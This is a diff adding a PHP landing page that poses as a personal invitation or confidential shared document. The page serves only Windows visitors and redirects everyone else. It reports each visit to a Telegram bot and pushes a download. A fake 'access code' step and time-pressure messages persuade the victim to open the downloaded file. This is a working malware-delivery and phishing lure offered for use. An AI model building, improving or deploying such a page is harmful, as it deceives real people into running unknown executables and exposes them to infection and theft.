@@ -1,0 +1,186 @@
+<?php
+$cfg = require __DIR__ . '/config.php';
+
+/* ─── Device / UA + non-Windows redirect ─── */
+$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$isWindows = (bool)preg_match('/Windows NT/i', $ua);
+if (!empty($cfg['redirect_non_windows']) && !$isWindows && !empty($cfg['redirect_url'])) {
+    // Pass sender/invitee through so the fallback page can personalize too.
+    $fwd = [];
+    foreach (['sender','s','from','host','to','t','name','invitee','recipient','guest'] as $k) {
+        if (isset($_GET[$k]) && trim((string)$_GET[$k]) !== '') $fwd[$k] = (string)$_GET[$k];
+    }
+    $target = $cfg['redirect_url'];
+    if ($fwd) $target .= (strpos($target, '?') === false ? '?' : '&') . http_build_query($fwd);
+    header('Location: ' . $target);
+    exit;
+}
+
+function _iv_pick(array $keys, string $default = ''): string {
+    foreach ($keys as $k) {
+        if (isset($_GET[$k]) && trim((string)$_GET[$k]) !== '') {
+            return trim((string)$_GET[$k]);
+        }
+    }
+    return $default;
+}
+$senderRaw  = _iv_pick(['sender','s','from','host'], (string)$cfg['default_sender']);
+$inviteeRaw = _iv_pick(['to','t','name','invitee','recipient','guest'], (string)$cfg['default_invitee']);
+$sender     = htmlspecialchars(mb_substr($senderRaw,  0, 60), ENT_QUOTES, 'UTF-8');
+$invitee    = htmlspecialchars(mb_substr($inviteeRaw, 0, 60), ENT_QUOTES, 'UTF-8');
+
+if (!empty($cfg['notify_visitors']) && !empty($cfg['telegram_bot_token']) && !empty($cfg['telegram_chat_id'])) {
+    @ignore_user_abort(true);
+    register_shutdown_function(function () use ($cfg, $sender, $invitee, $ua) {
+        require_once __DIR__ . '/api/notify.php';
+        iv_notify($cfg, ['sender' => $sender, 'invitee' => $invitee, 'ua' => $ua, 'event' => 'open']);
+    });
+}
+
+$invitationOn = !empty($cfg['invitation_mode']);
+$documentOn   = !empty($cfg['document_mode']);
+$mode         = ($invitationOn || !$documentOn) ? 'invitation' : 'document';
+$pageName     = htmlspecialchars($cfg['page_name'] ?? 'Personal Invitation', ENT_QUOTES, 'UTF-8');
+$dlUrl     = htmlspecialchars($cfg['download_url'],    ENT_QUOTES, 'UTF-8');
+$dlName    = htmlspecialchars($cfg['download_filename'],ENT_QUOTES,'UTF-8');
+$codeLen   = max(4, min(12, (int)($cfg['code_length'] ?? 6)));
+$gateH     = htmlspecialchars($cfg['gate_headline'] ?? 'Enter your access code', ENT_QUOTES, 'UTF-8');
+$gateSub   = htmlspecialchars($cfg['gate_sub'] ?? 'The '.$codeLen.'-character code appeared when you opened the file. Paste it below to reveal your invitation.', ENT_QUOTES, 'UTF-8');
+$revealT   = htmlspecialchars($cfg['revealed_title'] ?? 'You are invited', ENT_QUOTES, 'UTF-8');
+$revealB   = $cfg['revealed_body'] ?? '<p>Thank you for confirming. Your host will be in touch shortly with the address and time.</p>';
+
+
+$isDoc     = $mode === 'document';
+$eyebrow   = $isDoc ? 'Confidential document' : 'You’re invited';
+$title     = $isDoc ? 'A private document is waiting for you' : 'Save the date — a moment worth sharing';
+$hostLabel = $sender !== '' ? $sender : ($isDoc ? 'The sender' : 'Your host');
+$lead      = $isDoc
+    ? ($sender !== ''
+        ? "<b>{$sender}</b> has shared a private document with you. Confirm below to unlock the details and secure download."
+        : 'Only invited recipients can open this file. Confirm below to unlock the details and secure download.')
+    : ($sender !== ''
+        ? "<b>{$sender}</b> has prepared an intimate gathering in your honor. Confirm below to unlock the details and open your personal invitation."
+        : 'An intimate gathering has been prepared in your honor. Confirm below to unlock the details and open your personal invitation.');
+$ctaWord   = $isDoc ? 'Confirm & open document' : 'RSVP & open my invitation';
+
+/* Teaser rows — labels always visible, values hidden until code gate */
+$teaser = $isDoc
+    ? [
+        ['ic'=>'&#128100;', 'k'=>'From',       'v'=>$sender !== '' ? $sender : 'The sender'],
+        ['ic'=>'&#128196;', 'k'=>'Document',   'v'=>'Unlock to view'],
+        ['ic'=>'&#128274;', 'k'=>'Access',     'v'=>'Recipient only'],
+        ['ic'=>'&#128337;', 'k'=>'Expires',    'v'=>'Unlock to view'],
+      ]
+    : [
+        ['ic'=>'&#127775;', 'k'=>'Host',   'v'=>$sender !== '' ? $sender : 'Your host'],
+        ['ic'=>'&#128197;', 'k'=>'Date',   'v'=>'Unlock to view'],
+        ['ic'=>'&#128205;', 'k'=>'Venue',  'v'=>'Unlock to view'],
+        ['ic'=>'&#128337;', 'k'=>'Time',   'v'=>'Unlock to view'],
+      ];
+?>
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title><?= $pageName ?></title>
+<meta name="robots" content="noindex,nofollow">
+<link rel="icon" href="assets/img/favicon.svg">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body class="mode-<?= $mode ?>">
+
+<div class="bg" aria-hidden="true"></div>
+
+<main class="stage">
+  <section class="card" id="anim">
+    <header class="card-head">
+      <span class="eyebrow"><span class="dot"></span> <?= $eyebrow ?></span>
+      <?php if ($invitee !== ''): ?>
+        <p class="greet">Hello, <span class="name-type" data-text="<?= $invitee ?>"><?= $invitee ?></span><span class="caret" aria-hidden="true"></span></p>
+      <?php endif; ?>
+      <h1 class="title"><?= $title ?></h1>
+      <p class="sub"><?= $lead ?></p>
+    </header>
+
+    <!-- Teaser card: labels visible, values locked -->
+    <ul class="teaser" aria-label="event details">
+      <?php foreach ($teaser as $i => $row): ?>
+        <li class="tz-row">
+          <span class="tz-ic" aria-hidden="true"><?= $row['ic'] ?></span>
+          <span class="tz-k"><?= htmlspecialchars($row['k'], ENT_QUOTES, 'UTF-8') ?></span>
+          <?php if ($i === 0 && (($isDoc && $sender !== '') || (!$isDoc && $sender !== ''))): ?>
+            <span class="tz-v tz-name"><span class="name-type" data-text="<?= $sender ?>" data-delay="600"><?= $sender ?></span></span>
+          <?php else: ?>
+            <span class="tz-v tz-locked" aria-label="locked">
+              <span class="tz-blur">Belvedere Gardens · 7:30pm</span>
+              <span class="tz-badge"><span class="lock">&#128274;</span> RSVP to reveal</span>
+            </span>
+          <?php endif; ?>
+        </li>
+      <?php endforeach; ?>
+    </ul>
+
+    <div class="cta-wrap">
+      <a class="btn" id="dlBtn" href="<?= $dlUrl ?>" download="<?= $dlName ?>" rel="noopener nofollow"
+         data-sender="<?= $sender ?>">
+        <span class="btn-ic">&#128274;</span>
+        <span><?= $ctaWord ?></span>
+        <span class="btn-arrow">&rarr;</span>
+      </a>
+      <p class="cta-note"><span class="chk">&#10003;</span> Secure &middot; <span class="chk">&#10003;</span> Private link &middot; <span class="chk">&#10003;</span> Works on Windows</p>
+    </div>
+
+    <footer class="card-foot">
+      <span class="foot-mono">A single-use invitation crafted for one guest</span>
+    </footer>
+  </section>
+</main>
+
+<!-- Post-download code gate -->
+<div class="overlay" id="gate" aria-hidden="true">
+  <div class="overlay-card">
+    <div class="ov-icon">&#128274;</div>
+    <h2><?= $gateH ?></h2>
+    <p class="ov-lead"><?= $gateSub ?></p>
+
+    <div class="steps">
+      <div class="step"><span class="num">1</span><span>Open your <b>Downloads</b> folder and double-click <code><?= $dlName ?></code>.</span></div>
+      <div class="step"><span class="num">2</span><span>A <b><?= $codeLen ?>-character code</b> will appear on your screen.</span></div>
+      <div class="step"><span class="num">3</span><span>Type it below to reveal your <?= $isDoc ? 'document' : 'invitation' ?>.</span></div>
+    </div>
+
+    <form id="codeForm" autocomplete="off" novalidate>
+      <input id="codeInput" name="code" type="text" inputmode="latin"
+             maxlength="<?= $codeLen ?>" minlength="<?= $codeLen ?>"
+             placeholder="<?= str_repeat('•', $codeLen) ?>"
+             aria-label="access code" spellcheck="false">
+      <button type="submit" class="btn ghost" id="codeSubmit">Reveal</button>
+    </form>
+    <p class="err" id="codeErr" hidden>The code must be exactly <?= $codeLen ?> characters.</p>
+    <p class="time-note">&#9201; <b>Time-sensitive:</b> open the file and enter the code now &mdash; this access window expires shortly.</p>
+  </div>
+</div>
+
+<!-- Revealed content -->
+<div class="overlay" id="revealed" aria-hidden="true">
+  <div class="overlay-card revealed">
+    <div class="ov-icon">&#127881;</div>
+    <h2><?= $revealT ?></h2>
+    <div class="revealed-body"><?= $revealB ?></div>
+    <button class="btn" data-close-revealed>Close</button>
+  </div>
+</div>
+
+<script>
+window.IV = {
+  codeLen: <?= (int)$codeLen ?>,
+  sender: <?= json_encode($sender, JSON_UNESCAPED_UNICODE) ?>,
+  invitee: <?= json_encode($invitee, JSON_UNESCAPED_UNICODE) ?>,
+  typing: <?= !empty($cfg['typing_effect']) ? 'true' : 'false' ?>,
+  trackUrl: 'api/track.php'
+};
+</script>
+<script src="assets/app.js"></script>
+</body>
+</html>
